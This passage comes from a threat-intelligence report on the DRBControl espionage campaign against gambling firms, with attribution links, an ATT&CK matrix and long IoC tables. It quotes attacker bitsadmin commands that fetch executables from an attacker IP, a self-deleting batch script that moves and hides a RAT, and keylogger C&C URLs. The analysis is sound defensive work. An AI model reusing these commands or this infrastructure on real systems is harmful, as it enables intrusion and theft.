technically-proficient \n\ntools in their attacks.23 Over the years, Winnti-related activities have suggested that there are likely more \n\nthan one group of attackers behind the Winnti umbrella.24\n\nIt is highly probable that Winnti is comprised of several closely related threat actors that share tools and \n\nparts of attack infrastructures. How closely they work together is still unknown. Some speculate that there \n\nmight be one central development group providing malware and tools for the others, or that each entity \n\ncreates its own software that they later share with peers.\n\nThe first link we found was the mutexes shared between two malware families with different infrastructure. \n\nOne of the Trochilus samples, named diskshawin.exe, had links to the domain name fn.shopingchina[.]net \n\nand is dropped by a custom installer file that uses the following mutexes:\n\n\u2022  cc5d64b344700e403e2sse\n\n\u2022  cc5d6b4700e403e2sse\n\n\u2022  cc5d6b4700032eSS\n\nThe mutexes were also found in a BbsRat sample, which is named diskwinshadow.exe and contacts the \n\ndomain name bot.googlerenewals[.]net. The same domain name has been listed in a 2017 Clearsky report \n\non the Winnti group\u2019s activities.25\n\n24 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fThe second and third link we found come from two commands issued by the attacker in a compromised \n\nmachine:\n\n\u2022  bitsadmin /transfer n http://185.173.92[.]141:33579/i610.exe c:\\users\\public\\wget.exe\n\n\u2022  bitsadmin /transfer n http://185.173.92[.]141:33579/t32d.exe c:\\users\\public\\wget.exe\n\nA  look  into  the  passive  DNS  of  the  IP  address  185.173.92[.]141  revealed  that  the  domain  name  asia.\n\ngooglerenewals[.]net was used close to the timeline of our incident. Finally, we searched for executables \n\nnamed  t32d.exe  and  found  a  sandbox  report  for  a  malware  contacting  the  domain  name  test3.\n\nfacebooknavigation[.]com. Like googlerenewals[.]net, facebooknavigation[.]com was also listed as Winnti-\n\nrelated in the aforementioned report.\n\nEmissary Panda/LuckyMouse/APT 27\n\nWe also found some links with Emissary Panda (a.k.a. LuckyMouse, APT27, and Iron Tiger). The first one \n\ninvolves the use of the HyperBro backdoor, which appears to be exclusive to the threat actor. All reports \n\nwe found on this backdoor mention campaigns attributed to Emissary Panda.26, 27\n\nWhile it is a very loose link, we also noticed that the packed version of HyperBro was named thumb.db in \n\nthe Emissary Panda case, while the one in this campaign is named thumb.dat. The executable used for \n\nDLL side-loading, however, is entirely different.\n\nHaving found  relations with Winnti and Emissary Panda  reminded  us  that we also  found some signed \n\nmalware certificates being shared by both groups in the past.\n\n25 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fConclusion\n\nAttribution is a complicated aspect of cybersecurity, and it is not the goal of this publication. What we have \n\ndiscovered in our analysis, however, is the existence of a significant number of indicators of compromise \n\n(IoCs) and intriguing connections with at least two known APT groups.\n\nThis research delves into the modus operandi and different kinds of malware used by DRBControl, whose \n\ngoal is to steal source code and data from gambling and betting companies located in Asia.\n\nWe did not find information regarding attacks in other parts of the world. However, this is not to say that \n\nthere has been none.\n\nThe threat actor described here shows solid and quick development capabilities regarding the custom \n\nmalware used, which appears to be exclusive to them. The campaign exhibits that once an attacker gains \n\na foothold in the targeted entity, the use of public tools can be enough to elevate privileges, perform lateral \n\nmovements in the network, and exfiltrate data.\n\nTrend Micro Solutions\n\nTrend Micro\u2122 Deep Discovery\u2122 provides detection, in-depth analysis, and proactive response to today\u2019s \n\nstealthy malware and targeted attacks in real-time through specialized engines,28 custom sandboxing,29 \n\nand seamless correlation across the entire attack lifecycle, even without any engine or pattern update. \n\nTo defend against spam and email threats,30 businesses can consider Trend Micro\u2122 endpoint solutions \n\nsuch as Trend Micro Smart Protection Suites31 and Worry-Free\u2122 Business Security.32 Trend Micro Deep \n\nDiscovery\u2122 has an email inspection layer that can protect enterprises by detecting malicious attachments \n\nand  URLs.33  Trend  Micro\u2122  Deep  Security\u2122  and  Vulnerability  Protection  provide  virtual  patching  that \n\nprotects endpoints from threats that abuses unpatched vulnerabilities.34, 35\n\nTrend  Micro\u2019s  suite  of  security  solutions  is  powered  by  XGen\u2122  security,36  which  features  high-fidelity \n\nmachine learning to secure the gateway and endpoint data and applications.37 XGen\u2122 protects against \n\ntoday\u2019s purpose-built threats that bypass traditional controls, exploit known, unknown, or undisclosed \n\nvulnerabilities, and either steal or encrypt personally identifiable data.\n\n26 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fMITRE ATT&CK Matrix\u2122\n\nInitial Access\n\nExecution\n\nPersistence\n\nPrivilege Escalation\n\nSpearphishing Attachment\n\nCommand-Line Interface\n\nBITS Jobs\n\nAccess Token Manipulation\n\nExecution through API\n\nDLL Search Order Hijacking\n\nBypass User Account Control\n\nExecution through Module Load\n\nHidden Files and Directories\n\nDLL Search Order Hijacking\n\nExploitation for Client Execution\n\nNew Service\n\nExploitation for Privilege Escalation\n\nRedundant Access\n\nNew Service\n\nRegistry Run Keys / Startup Folder\n\nProcess Injection\n\nPowerShell\n\nScripting\n\nService Execution\n\nSigned Binary Proxy Execution\n\nUser Execution\n\nWindows Management Instrumentation\n\nDefense Evasion\n\nCredential Access\n\nDiscovery\n\nLateral Movement\n\nAccess Token Manipulation\n\nBrute Force\n\nAccount Discovery\n\nRemote File Copy\n\nBITS Jobs\n\nCredential Dumping\n\nApplication Window Discovery\n\nBypass User Account Control\n\nCredentials from Web Browsers\n\nFile and Directory Discovery\n\nConnection Proxy\n\nInput Capture\n\nNetwork Share Discovery\n\nDeobfuscate/Decode Files or Information\n\nDLL Search Order Hijacking\n\nDLL Side-Loading\n\nFile Deletion\n\nHidden Files and Directories\n\nMasquerading\n\nModify Registry\n\nObfuscated Files or Information\n\nProcess Hollowing\n\nProcess Injection\n\nRedundant Access\n\nScripting\n\nSigned Binary Proxy Execution\n\nSoftware Packing\n\nWeb Service\n\nProcess Discovery\n\nQuery Registry\n\nRemote System Discovery\n\nSystem Information Discovery\n\nSystem Network Con\ufb01guration Discovery\n\nSystem Network Connections Discovery\n\nSystem Owner/User Discovery\n\nSystem Service Discovery\n\nSystem Time Discovery\n\nCollection\n\nCommand And Control\n\nEx\ufb01ltration\n\nClipboard Data\n\nCommonly Used Port\n\nEx\ufb01ltration Over Alternative Protocol\n\nData from Local System\n\nConnection Proxy\n\nData from Network Shared Drive\n\nCustom Command and Control Protocol\n\nInput Capture\n\nScreen Capture\n\nCustom Cryptographic Protocol\n\nData Obfuscation\n\nFallback Channels\n\nMulti-Stage Channels\n\nMultilayer Encryption\n\nRemote File Copy\n\nStandard Application Layer Protocol\n\nUncommonly Used Port\n\nWeb Service\n\n27 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n \n \n \n \n \n \n \n\fIndicators of Compromise (IoCs)\n\nPayload\n\nSHA-256\n\nTrend Micro Pattern Detection\n\nNotes\n\na44136c9ae13435882c5c2aded9ed8bd5e8c1a64520ab83a17cffa03ea3852d1\n\nBackdoor.Win64.CLAMBLING.B\n\nbfd5056cfbec3a43656c2ceb27cacea5de27c7a82f21d2897826ce1e1748666a\n\nBackdoor.Win64.CLAMBLING.B\n\n3d0d4945275cdbae9911183dd17fb5e118216816e1c9abc2cecfb65c4ef9d708\n\nBackdoor.Win64.CLAMBLING.B\n\na219dfc28426bf36af578e2dbc4a65abdae51e0c3df87c4cb3a2c8f9e0088d32\n\nBackdoor.Win64.CLAMBLING.B\n\nf9759b5046d67d07ed4a0b07316d6797feb2293a8cbd3c4bc78c90269b87fe3f\n\nBackdoor.Win64.CLAMBLING.B\n\n29e50893c10897684d8b81f0d511d4073442e385d2ab2ee6c9a9c0189851f72c\n\nBackdoor.Win64.CLAMBLING.B\n\nbd278f8fbd5af15beddf5f1d8f7c20bec368fae2e7cb5ef16e2b50434d30a384\n\nBackdoor.Win64.CLAMBLING.B\n\nc3c70ca2c473e166d0890450c70e3fafdc98f10f2027a1aa0d78a75170df2b69\n\nBackdoor.Win64.CLAMBLING.B\n\n9b957bfe1bdbed23e5d45d6f30c7d666f2c65af32779d09927dfc0f79f6f7b91\n\nBackdoor.Win32.CLAMBLING.A\n\ne82e7b6dbf074bb189cd639f70137d3d4350423fd4e84898688920d0110110b8\n\nBackdoor.Win32.CLAMBLING.A\n\n9e3b82a55d3bd9773aaa50396436aec085eeb34e6efda70d6b2946a571911601 Backdoor.Win32.CLAMBLING.A\n\n9897e28cd7f1e26eb9115c99188192747ea39fee9aa8c22633e336beeb76f109\n\nBackdoor.Win32.CLAMBLING.A\n\ncd5a3c0d92b76bd29fbb5dffaab6144487d35d83d3ab3e4ea545a0ea58ca9140\n\nBackdoor.Win32.CLAMBLING.A\n\n76e41cd6cd30af04fbe540de60fa0f0873d65fb94727b921b2483c5d9e1cbdeb\n\nBackdoor.Win32.CLAMBLING.A\n\n58597b5469a9b1af44b73937c3c44ce4dcea841a3eff3508dc0bed0bcb2ff10a\n\nBackdoor.Win32.CLAMBLING.A\n\n46532c3fbd3e73682ea7c4fdec6a26fffa7baff36a78fd821b8bfe7721fc92ef\n\nBackdoor.Win32.CLAMBLING.A\n\nb35e3d9835910c50502cf4753e77b50d279a9f9056f64bd609b865ded8a79d0c\n\nBackdoor.Win32.CLAMBLING.A\n\n8c03324d303c4bf4f180f400537a307750561de37ed92691d46c09ef2caa22b0\n\nBackdoor.Win32.CLAMBLING.A\n\nc88196c1ec9d29326cee11d04e73a3f6ce80a2bad5363925fd9520e64727407b\n\nBackdoor.Win32.CLAMBLING.A\n\n832c5cbe153d7687e8e72a1108bf2f38e88d30de5b9432c5ff8fdef9d190ec02\n\nBackdoor.Win32.CLAMBLING.A\n\n8bc65935aa19e95b52d7ecc1d5d8f15c0c85fde28d39c0a1844ca90a912cd502\n\nBackdoor.Win32.CLAMBLING.A\n\n23cd30aaf21d02bde349e6c1761165120c0e2ded626a2de583103e1559e5b9f4\n\nTrojan.Win32.CLAMBLING.ENC\n\nfa10b6cf0bd9de0734ecca6650de214647ec7305af90f9a4dfdc5e092706cb11\n\nTrojan.Win32.CLAMBLING.ENC\n\n021751637a8fff2c48fd543316c25a7090d4ac96f81efb2cfd2a8bb239bafdfd\n\nTrojan.Win32.CLAMBLING.ENC\n\nf52b3f5f8213709bb5617fd02e702dee10935eefb96f44e8afa35af17c81d05b\n\nTrojan.Win32.CLAMBLING.ENC\n\nd1294a1e043bb882e99f278fa51ceefadc0939fedc47306e475fbdcbb210dc5b\n\nBackdoor.Win32.CLAMBLING.C\n\n927da2ff9203eb77a66fa7b23f9f1c3655b357fc2418422ed2d5813882a6ae5a\n\nBackdoor.Win32.CLAMBLING.C\n\n64469d27fec40f50b06812c2d2fdbe5dd73a3b258f304f48f97e9c792e1a0c6f\n\nBackdoor.Win32.CLAMBLING.D\n\ne52034cb8b5f170c8174ea2b9ede2785d093360a57359261e2dfb436cd644038\n\nBackdoor.Win32.CLAMBLING.D\n\nx64\n\nx64\n\nx64\n\nx64\n\nx64\n\nx64\n\nx64\n\nx64\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx86\n\nx64\n\nx64\n\nx86\n\nx86\n\nx64\n\nx86\n\nx64\n\nx64\n\n28 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fSpear-Phishing Documents\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\n489310f5f63045a83251c4f457d2baa4b0c57e5ee7b3d147ee63913352a2c7f1\n\nTrojan.W97M.CLAMBLING.A\n\ncd651d4e8e5f9587f560a94c0a5ec6283938b906b4831341beb186eec11145cd\n\nTrojan.W97M.CLAMBLING.A\n\nb4d4dfeb086872500891aa875eb221e8fc95e0c4566a07bc8adda5bd19ab76f3\n\nTrojan.W97M.CLAMBLING.A\n\n0351c808c016cd5190ea45d5243c6a2c6cd3b5fc4e22571e06b948910e5535f9\n\nTrojan.W97M.CLAMBLING.A\n\n9a6da3d7465b7cf6da32f80f2cd9009d7726dfbb128ec0b343fccfcc954de96a\n\nTrojan.W97M.CLAMBLING.B\n\nType 0\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\n5aee7ae5dd28fcd7e672912292061022c29538bf9264db56b30efdbc8d45abc0\n\nTrojan.Win32.CLAMBLING.A\n\nd5e98fb0f05f28183f51a66b0032525ebedc55f056c0ddff2bf15a5eb3016fdd\n\nTrojan.Win32.CLAMBLING.A\n\nType 1 backdoor samples\n\nDropper\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\n0aa627736df73c543c26c3f033f1962282dd005e6a0ec8d9357df3511b2fc8a6\n\nTrojan.Win64.CLAMBLING.A\n\n52c02e9d24913761f508b0be1604b357acbe73c65df410b5588eef0e14cf812f\n\nTrojan.Win64.CLAMBLING.A\n\nd4d8a8cd8da49c7ae974d6774458d6267463eb62e798ced51865e7f88a64969e\n\nTrojan.Win64.CLAMBLING.A\n\nType 1\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\ne18af309ecc3bc93351b9fa13a451e8b55b71d9edcc4232bc53eb1092bdfa859\n\nTrojan.Win64.CLAMBLING.A\n\na22815279cac432e5951cec72a0d24a53319e2d85e843e436c8b181ab43979b6\n\nTrojan.Win32.CLAMBLING.A\n\nd2f12b1492ab90e61c16d41d79ee3f28a7773656ccf4c3459afedb2bf46cca18\n\nTrojan.Win32.CLAMBLING.A\n\n0105718608ae7b8d782ae6e480d685dca1abc2deef29f0241d70de88f6da8dd5\n\nTrojan.Win32.CLAMBLING.A\n\n24ebd398be23135a2d8aa7000c2b6a534448b87aa5708b8546089630a8035f7e\n\nBackdoor.Win64.CLAMBLING.A\n\n96282a625a31b6bf646c6e01ad20de96fd63c345881a9c91190940121580059d\n\nBackdoor.Win64.CLAMBLING.A\n\n0693713f995285e8bd99ebfca2c4f0f1a8e824dafb5a99693442a9256df06e02\n\nBackdoor.Win64.CLAMBLING.A\n\nb226c8e85a7b1a6d4d29d42fc84bc7f3a32335fc7ba44b455a7716d706660873\n\nBackdoor.Win64.CLAMBLING.A\n\na3d9aac7291e356a64b0892f4ec85f1cdcb3dea71b820917fcd5011fb555989d\n\nBackdoor.Win64.CLAMBLING.A\n\n9dd1d21e9431cfe25709a8f26ec0f605ed19cf64ca1922e97fad7b7f2d2e82ea\n\nBackdoor.Win64.CLAMBLING.A\n\n56758c25e3b00957c6f7f76fcea5d0598eff7eda98c63f50b51d1c28f267ac8f\n\nBackdoor.Win64.CLAMBLING.A\n\n29 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fC&C\n\nFile path\n\nService name\n\nCampaign \nname\n\nVersion\n\n1.0\n\n4.0\n\n4.0\n\nwww.kkxx888666[.]com:53 \nwww.betwln520[.]com:110\n\ndownload.safedog[.]co:80 \ndownload.safedog[.]co:443\n\n%ALLUSERSPROFILE%\\Update\\\nupdate.exe\n\nwuau\n\nN/A\n\nN/A\n\n%ALLUSERSPROFILE%\\download\\\nSKTest.exe\n\ndownload\n\nN/A\n\ntest66.shopingchina[.]net:80\n\n%ALLUSERSPROFILE%\\S\\s.exe\n\ngoogleupdate\n\n587694\n\nupdate.google.com.updatesrvers[.]org:80\n\n%ALLUSERSPROFILE%\\google\\\nGoogleUpdate.exe\n\ngupdate\n\ngoogle\n\nsafe.mircosofdevice[.]com:80 \nsafe.mircosofdevice[.]com:53 \nsafe.mircosofdevice[.]com:5000\n\noffice.support.googldevice[.]com:8080 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\noffice.support.googldevice[.]com:80 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\n%ALLUSERSPROFILE%\\Microsoft\\\nDRM\\Server\\WinDRM.exe\n\nWinDRM\n\n123456\n\n8.0\n\n%SystemRoot%\\system32\\sysprep\\ \nRSoPProv.exe\n\nRSoPProv\n\n123456\n\n8.0\n\n%ALLUSERSPROFILE%\\Firewall\\\nFirewall.exe\n\nFirewall\n\n123456\n\n8.0\n\nsafe.mircosofdevice[.]com:53 \nsafe.mircosofdevice[.]com:5000\n\n%ALLUSERSPROFILE%\\Microsoft\\\nDRM\\Server\\WinDRM.exe\n\nWinDRM\n\n123456\n\n8.0\n\n45.77.41[.]49:80 \n45.77.41[.]49:53 \n45.77.41[.]49:500\n\noffice.support.googldevice[.]com:8080 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\noffice.support.googldevice[.]com:80 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\noffice.support.googldevice[.]com:80 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\noffice.support.googldevice[.]com:80 \noffice.support.googldevice[.]com:53 \noffice.support.googldevice[.]com:5000\n\n35.220.232[.]71:53 \n35.220.232[.]71:554\n\n%SystemRoot%\\system32\\drivers\\\nUMDF\\RSoPProv.exe\n\nRSoPProv\n\n123456\n\n8.0\n\nC:\\Windows\\system32\\rsoplicy.exe\n\nRSoPProv\n\n123456\n\n8.0\n\n%SystemRoot%\\system32\\sysprep\\\nRSoPProv.exe\n\nRSoPProv\n\n123456\n\n8.0\n\n%SystemRoot%\\system32\\sysprep\\\nRSoPProv.exe\n\nRSoPProv\n\n123456\n\n8.0\n\n%SystemRoot%\\system32\\sysprep\\\nRSoPProv.exe\n\nRSoPProv\n\n123456\n\n8.0\n\nC:\\Users\\public\\Videos\\Videos.exe\n\nVideos\n\ngoogle\n\n9.0\n\n30 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fType 2 backdoor samples\n\nSHA-256\n\nNames\n\nTrend Micro \nPattern Detection\n\na58946c10c8325040634f7cd04429b9f1e3715767d0c8aec46b7cba8975e6a69\n\nTrojan.Win64.CLAMBLING.A\n\n52c147c8eadb58d3580b39c023ce4a90dacce76ee5c30c56c56ea39939a56b52\n\nBackdoor.Win64.CLAMBLING.A\n\nb5546d4931a0316abd4018c982558ed808b4d0a60233ac18bee601fa09d95ee6\n\nBackdoor.Win64.CLAMBLING.A\n\ndd0399970d2dbb5ab8b5869e2fafb83194c992f27bbb244adce35e2fe6ef0d28\n\nBackdoor.Win32.CLAMBLING.A\n\n017a10eebddd3a1aca9b035413906da562331c6d1675efb02bb63bbe13b99165\n\ngoopdate.dll\n\nTrojan.Win32.CLAMBLING.END\n\nf80f78972b58ab78b0657c546323538966d9cd828892d4dc07cee6f6d5614f6b\n\ninfo.cab\n\nTrojan.Win32.CLAMBLING.END\n\n98a0a78219aa7d67865615090d53916c9b4e7d3ea900080c268806c48bb41499\n\nEnglish.rtf\n\nBackdoor.Win32.CLAMBLING.E\n\nC&C\n\nFile paths\n\n%ALLUSERSPROFILE%\\DRM\\DRM.exe\n\nService \nnames\n\nWinDRM\n\n%ALLUSERSPROFILE%\\DRM\\drm.exe\n\nDRM\n\n%ALLUSERSPROFILE%\\KasperskyLab\\Kaspe\\Kaspe.exe\n\nKaspe\n\nupdate.mircosoftdefender[.]com:8080 \nupdate.mircosoftdefender[.]com:30\n\nupdate.mircosoftdefender[.]com:80 \nupdate.mircosoftdefender[.]com:443\n\nstore.microsoftbetastore[.]com:443 \nstore.microsoftbetastore[.]com:8080\n\nType 3\n\nSHA-256\n\nTrend Micro Pattern Detection\n\nee5f7e6ad4a344f40b9babada1654ea22333bb5150cfd26bfc239ead28b6528c\n\nTrojan.Win32.CLAMBLING.A\n\nca26a34153972cc73c63d3a9aadd3b12ba35ecdc6e39025b75be56b00c20e0ae\n\nTrojan.Win64.CLAMBLING.A\n\n1951c79f280692a43b7c7cafd45c3f5d7f4f841ae104a6cad814fab4641c79f2\n\nTrojan.Win32.CLAMBLING.A\n\nd5129308ee83a852e6a320ca68c8e66ed6d1eb4ec584dd0c8b5f313a56c49a15\n\nTrojan.Win32.CLAMBLING.A\n\n2fcb7ae3387634fda8f2fa87b7d2eac03660fce49f0732b07d8cf41693801577\n\nTrojan.Win32.CLAMBLING.A\n\n8b8735a05ce7dc5f061fc1bd1ca4ad9934da26d8c1d0585db72dfe74115ee6ed\n\nBackdoor.Win32.CLAMBLING.D\n\n31 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fDropbox uploader\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\na58f2fea8c74c1d25090014c7366db224102daa6c798fcdfb7168b569b7d5ca2\n\nTrojan.Win32.DBUPLODR.A\n\nd201e726fd2a2f4b55ea5ca95f0429d74e2efb918c7c136d55ef392ceac854d6\n\nTrojan.Win32.DBUPLODR.A\n\nd62ddac7c4aa152cf6f988db6c7bd0c9dcffa2e890d354b7e9db7f3b843fd270\n\nTrojan.Win32.DBUPLODR.A\n\nd72c3f5f2f291f7092afd5a0fcaceaf2eaae44d057c9b3b27dd53f2048ed6175\n\nTrojan.Win32.DBUPLODR.A\n\n28d2637139231c78a6493cd91e8f0d10891cfeb6c5e758540515faa29f54b6b2\n\nTrojan.Win32.DBUPLODR.A\n\n5713907c01db40cf54155db19c0c44c046b2c676a492d5ba13d39118c95139bf\n\nTrojan.Win32.DBUPLODR.A\n\n260b64e287d13d04f1f38d956c10d9fdd3cfbff6ba0040a52223fa41605bb975\n\nTrojan.Win32.DBUPLODR.A\n\nPlugX RAT\n\nSHA-256\n\nNames\n\nTrend Micro Pattern Detection\n\n9418c3ac53ed7bec0dea36918c3a1862868b2d8f4e696db509b1ec7aa09bd976\n\nKB3023607.zip\n\nBackdoor.Win32.PLUGX.DUKSS\n\nfdf1899eb1457acc2a59b89b0542d53cddcb5553e6fc53ced099473a59fce67c\n\nGoopdate.dll\n\nBackdoor.Win32.PLUGX.DUKSS\n\n970388a8256c722e792d26374a3db7c6015a6bab4544c3981fac0d928ef07a12\n\nLicense.rtf\n\nBackdoor.Win32.PLUGX.DUKSS\n\n6655c84e064f744e99fc4d7e50487239604df5f97996eaa8507df7744a8b4de3\n\nmpsvc.dll\n\nBackdoor.Win32.PLUGX.DUKSY\n\nwww.kkxx88866[.]com \n\nwww.betwln520[.]com\n\nTrochilus RAT\n\nSHA-256\n\nNames\n\nTrend Micro \nPattern Detection\n\n4e3e9e4613d414ba671fd35d7d70d0c3093cd322f5f297281a502420741c03c8\n\ndiskshawin.exe\n\nBackdoor.Win32.TROCHIL.A\n\n685f372013eb8b5580e603a159c4b68b226b2ae96e00629a567ee0d1ebcc66ec\n\nsetup443.exe\n\nBackdoor.Win32.TROCHIL.A\n\n8c0b0c86a3b055df36304d5421f1003e0e78368e421341d404e25ddf8f5f714b\n\nrpcss.dll\n\nBackdoor.Win32.TROCHIL.A\n\nf7ef0e754b004910d40a47ca57b9cf41f63e2a06ba7cc495cb40771a017a8689\n\nrpcss.dll\n\nBackdoor.Win32.TROCHIL.A\n\nc42ccb2c8dc43164db267b68578a3c8869adc4f5062063e7a6b942ecea8c4402\n\nrpcss.dll\n\nBackdoor.Win32.TROCHIL.A\n\n30998c7d7496bf36b70232935b9dd1b0f84a6b7f288417312aab37d2a5dc360e\n\ndata.dat\n\nBackdoor.Win32.TROCHIL.A\n\n180640b1e69c48eae468f59c7967df8d3f4dcfd0bb69ce3bbed3663b6ceebc87\n\nBackdoor.Win32.TROCHIL.A\n\n32 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fBatch script related to Trochilus RAT contains the following commands:\n\necho \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \n\nattrib  -H -S  c:\\windows\\fonts\\system.exe \n\nsc delete SESSRV \n\ntaskkill /f /im system.exe \n\ntaskkill /f /im system.exe \n\ndel /f /q c:\\windows\\fonts\\system.exe \n\ndel /f /q c:\\windows\\fonts\\system.exe \n\ndel /f /q c:\\windows\\fonts\\run.bat \n\npushd c: \n\nmd\\ProgramData\\Microsoft\\DeviceSync \n\nmove /y c:\\windows\\fonts\\diskshawin.exe c:\\ProgramData\\Microsoft\\DeviceSync \n\nmove /y c:\\windows\\fonts\\diskshawin.exe %allusersprofile%\\Microsoft\\DeviceSync \n\ncacls c:\\windows\\fonts\\clip.exe /e /c /g everyone:f attrib +H +S c:\\windows\\fonts\\clip.exe \n\nstart csres.exe\u201d \n\ndel %sfxcmd% \n\ndel %0\n\nHyperBro\n\nb823c03be8959b7636997616811ed69b2d611b8505b4f06958c7dc430e3cd681\n\nthumb.dat\n\nBackdoor.Win32.HYPERBRO.ENC  \n\nSHA-256\n\nName\n\nTrend Micro Pattern Detection\n\nWinnti\n\ngooglerenewals[.]net \n\nfacebooknavigation[.]com\n\nMFC keyloggers\n\nMalware related to the use of Microsoft Foundation Class (MFC) library captures clipboard and keystroke \n\ndata and sends the information to two different PHP scripts hosted on the C&C:\n\nhxxp://jqb.shopingchina[.]net:88/index.php \n\nhxxp://jqb.shopingchina[.]net:88/mobile.php?pw=666\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\nae4b9dd3709e4e5e30ce62e7e4075f366f38676e2bad165da3ab4690251e70ae\n\nTrojan.Win32.FLYSTUDIO.D\n\n5da3811c4f15d04444d4c3721e7cc9be106bb1fe2b1bc95c3fe09d991df2a5e8\n\nTrojan.Win32.FLYSTUDIO.D\n\n33 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fCobalt Strike\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\n91ccf1148f8573a8ef74e9f65c330e8f1f5fe67dc33b99f30e0d3fed69f3d0f0\n\nTrojan.Win32.ROZENA.AM\n\nPost-exploitation tools\n\nSHA-256\n\nTrend Micro \nPattern Detection\n\n5b5aff8869ba7f1d3f6ad7711e801b031aedeff287a0dcb8f8ae6d6e4eb468af\n\nTrojan.Win64.CVE20170213.AA\n\n412260ab5d9b2b2aa4471b953fb67ddc1a0fe90c353e391819ca7ac1c6d3146f\n\nTrojan.Win32.CVE20170213.AA\n\nf4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd\n\nHKTL_EARTHWRM\n\n4c08bc1a2f5384c5306edc6f23e4249526517eb21a88763c8180a582438dfa31\n\nHackTool.Win32.PWDump.AC\n\nea45f845eb490991c56946441dce26fe5ecd62ec2b33afe9ba31f4432aa4f1ef\n\nHackTool.Win32.PWDump.AC\n\n4de1c404a9213a82d9fd1dea04fe097b6d92a1f7fda84481e6dda41d72dc34e5\n\nHackTool.Win32.PWDump.AC\n\nb5ce4eb3289c6794aecf3625b8c3b2044ddb1be93e538571ca8d5670c6fcf2ed\n\nHackTool.Win32.PWDump.AC\n\nd50debb2bce2d1a425f524a11a80b5dc24ae74a419024782095a0ba981cb483a\n\nHackTool.Win32.PWDump.AC\n\nc6064fb44733b5660557e223598d0e4d5c4448ad20b29e41bef469cb5df77da0\n\nHackTool.Win64.PWDump.B\n\n28d19a23d167db3e1282f1c6039bcda6556798be054994a55e60116827dd0bf1\n\nHackTool.Win64.PWDump.B\n\n929ff464b5e68b1dc4c5e5b2dc99acae1449a376251da87ab666698499f12ff7\n\nHackTool.Win32.IPScan.AB\n\n0a6dc8a6868f6882ea9d5998b01ab871746b1ba27641c1b3ff73985878081e93\n\nHackTool.Win32.Nbtscan.AA\n\n37286285cb0f8305bd23a693b2e7ace71538e4c0b9f13ee6ca4e9e9419657813\n\nHackTool.Win64.Mimikatz.AS\n\n57430caade5b791152f97b18e7037a4274e954ad5fed9b465063d43bde2d08a1\n\nHackTool.Win64.Mimikatz.AS\n\n799b7395c9f279d8cd1cd24657788ecb37db7ae03c0dddeb3344a95a551d1325\n\nHackTool.Win32.ClipboardLogger.A\n\n79928578cdd646a9724bc6851a1ee77820c81a3100788d62885f9d92b6814085\n\nHackTool.Win32.BypassUAC.B\n\neb8bb1e6b1f832a7009ba441d6365b225324ff582402daebfab83dcbcc55179f\n\nHackTool.Win32.BypassUAC.B\n\n7602e2932a10f3750a5d6236f6c1662047d4475c6e1fe6c57118c6620a083cb3\n\nHackTool.Win32.BypassUAC.B\n\nc425b73be7394032aa8e756259ebf3662c000afaa286c3d7d957891026f3cbb4\n\nHackTool.Win64.BypassUAC.A\n\nb3581e8611f5838fc205f66bc5ca5edddb0fd895e97ebf8f0c7220cb102ae14b\n\nHackTool.Win64.BypassUAC.A\n\ne5ee105aa029e3ad4b8f01ef4c78f4c65b623213925e91173488af1a4e15c177\n\nHackTool.Win64.BypassUAC.A\n\n4ccd6555b004ebde29d79c435e4d0191fd7cf607b2d3b7a0c83cb27b3a3b2cbf\n\nTrojan.Win32.Runner.AD\n\n24f501141af5bf059509145e165302dd7087b1d1c2136bc5e4403f01435f250e\n\nTrojan.Win32.RUNNER.AD\n\nfc865a720cb808354923092bac04ab6a75e20ea92db5a343af07365c0cd2b72a\n\nTrojan.Win32.RUNNER.AD\n\n34 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fOther malicious domains and IP addresses\n\nupdate[.]ipv4-cisco[.]com \n\nupdate[.]microsoftdnsdown[.]com \n\nupdate[.]microsoftdnsupdate[.]com \n\ncdn[.]kkxx888666[.]com \n\nfn[.]shopingchina[.]net \n\nsupport[.]microsoftdnsdown[.]com \n\ndata[.]dropboxbeta[.]com \n\nportal[.]microsoftbetastore[.]com \n\nhttp://www.imr.co[.]kr/upload/info[.]cab \n\n34.92.209[.]216 \n\n35.185.166[.]81 \n\n35.220.135[.]85 \n\n185.173.92[.]141 \n\n66.42.60[.]107 \n\n104.168.196[.]85\n\n35 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fReferences\n\n1  Daniel Lunghi and Jaromir Horejsi. (10 June 2019). Trend Micro. \u201cMuddyWater Resurfaces, Uses Multi-Stage Backdoor \n\nPOWERSTATS V3 and New Post-Exploitation Tools.\u201d Last accessed on 20 January 2020 at https://blog.trendmicro.com/\n\ntrendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-\n\ntools/.\n\n2  Feike Hacquebord. (12 January 2018). Trend Micro. 